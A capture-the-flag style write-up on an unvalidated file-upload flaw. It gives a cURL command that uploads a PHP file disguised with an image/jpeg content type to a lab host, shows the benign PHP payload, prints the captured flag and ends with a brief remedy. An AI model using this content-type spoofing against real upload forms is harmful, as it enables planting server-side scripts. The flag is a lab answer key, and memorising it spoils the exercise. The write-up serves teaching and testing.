# Unvalidated_File_Upload
When a web application allows and consists of functionalities that allow its users to upload files that are not validated by the server; This could cause some real proplems. An attacker can upload malicious files like some php, or js script that may exploit the sites users, it's sad but it is true. 


## Example
In <a href="">upload</a> such a functionality exists, now we can try to upload any file type and some which have a known files type by the client might be uploaded or not, but that does not mean we can't try doing the same using cURL, so let us do that.

## Exploit
All you have to do is run a bash script on your terminal, I have went throught the trouble of creating one fo you, you're welcome. just run bash upload.sh on your teminal, that will run this bash script.
``` bash
    curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@dreadful.php;type=image/jpeg' http://192.168.43.251/?page=upload# | grep "flag"
```
This will upload a php script called dreadful:
```bash
    <?php
        echo "You think you know me"
    ?>
```
We will grep the response to isolate our flag which is:
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## Remedy
* Validate file extensions and only accept those that you want.

## Resources
* https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76